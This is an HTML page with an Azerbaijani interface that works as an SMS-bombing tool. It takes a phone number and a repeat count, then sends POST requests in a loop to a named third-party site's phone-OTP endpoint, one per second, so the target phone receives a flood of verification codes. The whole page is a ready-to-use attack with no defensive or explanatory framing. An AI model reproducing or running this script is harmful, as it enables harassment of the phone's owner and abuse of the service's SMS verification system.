<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Göndərmə Paneli</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 350px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #log {
            margin-top: 15px;
            font-size: 14px;
            max-height: 150px;
            overflow-y: auto;
            background: #eee;
            padding: 10px;
            border-radius: 4px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>OTP Göndər</h2>
    <div class="form-group">
        <label for="phone">Telefon nömrəsi:</label>
        <input type="text" id="phone" placeholder="Məs: 994501234567">
    </div>
    <div class="form-group">
        <label for="count">Say (Neçə dəfə):</label>
        <input type="number" id="count" value="1" min="1">
    </div>
    <button onclick="startSending()">Göndər</button>
    
    <div id="log"></div>
</div>

<script>
    async function startSending() {
        const phone = document.getElementById('phone').value.trim();
        const count = parseInt(document.getElementById('count').value);
        const logDiv = document.getElementById('log');
        
        logDiv.innerHTML = '';

        if (!phone) {
            alert('Zəhmət olmasa nömrə daxil edin!');
            return;
        }

        const url = 'https://www.masin.az/api/auth/send-phone-otp';

        for (let i = 1; i <= count; i++) {
            try {
                // API-nin tələb etdiyi məlumat formatına uyğun olaraq body hissəsini dəyişə bilərsiniz
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({ phone: phone }) 
                });

                if (response.ok) {
                    logDiv.innerHTML += `[${i}] Uğurlu: Kod göndərildi.<br>`;
                } else {
                    logDiv.innerHTML += `[${i}] Xəta: Status ${response.status}<br>`;
                }
            } catch (error) {
                logDiv.innerHTML += `[${i}] Bağlantı xətası: ${error.message}<br>`;
            }
            
            // Sorğular arası qısa gözləmə əlavə etmək üçün (istəyə bağlı)
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
</script>

</body>
</html>
